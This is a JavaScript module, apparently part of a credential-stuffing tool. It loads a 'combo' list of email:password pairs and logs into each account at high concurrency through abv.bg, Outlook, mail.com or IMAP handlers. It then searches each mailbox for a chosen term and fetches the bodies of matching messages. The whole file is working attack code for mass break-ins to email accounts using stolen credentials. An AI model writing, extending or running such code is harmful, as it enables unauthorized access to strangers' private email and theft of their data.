
import mail from '../conf/servers.js'

import datasource from './@data.js';

import abv from './abv.js'
import imap from './imap.js'
import mailcom from './mailcom.js'
import outlook from './outlook.js'

import async from 'async'

import path from 'path'
import fs from 'fs'

const sessions = (function(){
	let map = datasource.loadSessions() || {};
	function save(user, session) {
		datasource.saveSession(user, session);
		map[user] = session;
	}
	map.save = save;
	return map
})()

const servers = {
	abv: abv(sessions),
	outlook: outlook(sessions),
	mailcom: mailcom(sessions),
	imap: imap(sessions)
}


function parseuser(lout) {
    let atdx = lout.indexOf("@")
    let btdx = lout.search(/[: |#]/)
    if (atdx > 0 && btdx > 0) {
        let user = lout.substr(0, btdx).toLowerCase();
        let pass = lout.substr(btdx+1);
        let domain = user.substr(atdx+1);
        return { user, domain, pass }
    } else return {}
}

function select(domain) {
	let server = mail[domain];
	if (server) {
		if (server[1] === 143 || server[1] === 993) return servers.imap(server[0], server[1])
	} else if (domain === "abv.bg") {
		return servers.abv;
	} else if (servers.outlook.DOMAINS.includes(domain)) {
		return servers.outlook
	} else if (servers.mailcom.DOMAINS.includes(domain)) {
		return servers.mailcom
	}
}

export default {
	search({ term, hits, finish }) {
		const combo = fs.readFileSync(path.resolve("src/conf/test.txt"), "utf-8").trim().split(/\r?\n/);
		
		let stats = {
			total: combo.length,
			processed: 0,
			hits: 0
		}

		const queue = async.queue((task, cb)=>{
			task(cb);
		},120);


		function factory(server, user, pass) {
			return async cb=>{
				(function execute(tries) {
					let cancelled = false;

					let timedout = setTimeout(function(){
						cancelled = true;

						if (tries < 3) {
							execute(tries+1)
						} else {
							cb();
						}
					}, 90000);

					server.login(user, pass).then(async api => {
						clearInterval(timedout);

						if (!cancelled) {
							if (!api.error) {
								const list = await api.search(term);
								if (!list.error && list.results.length > 0) {
									stats.hits++
									hits(list);
								} else {
									console.log("Search Error:", list.error);
								}
							} else {
								console.log("Login Error:", api.error);
							}
							stats.processed++
							cb();
						}
					})
				})(0);
			}
		}

		for (let entry of combo) {
			let { user, domain, pass } = parseuser(entry);
			if (user && domain && pass) {
				let server = select(domain);
				if (server) queue.push(factory(server,user,pass));
			} else {
				stats.total--;
			}
		}

		queue.drain(finish);

		return {
			progress() {
				return stats;
			}
		}
	},

	body(user, id) {
		return new Promise(async resolve=>{
			let domain = user.substr(user.indexOf("@")+1);
			let server = select(domain);
			const api = await server.login(user);
			const body = await api.body(id);
			if (body.error) {
				body.action = "body";
				console.log(body.error);
				resolve(body);
			} else {
				resolve({
					action: "body",
					body
				});
			}
		})
	}
}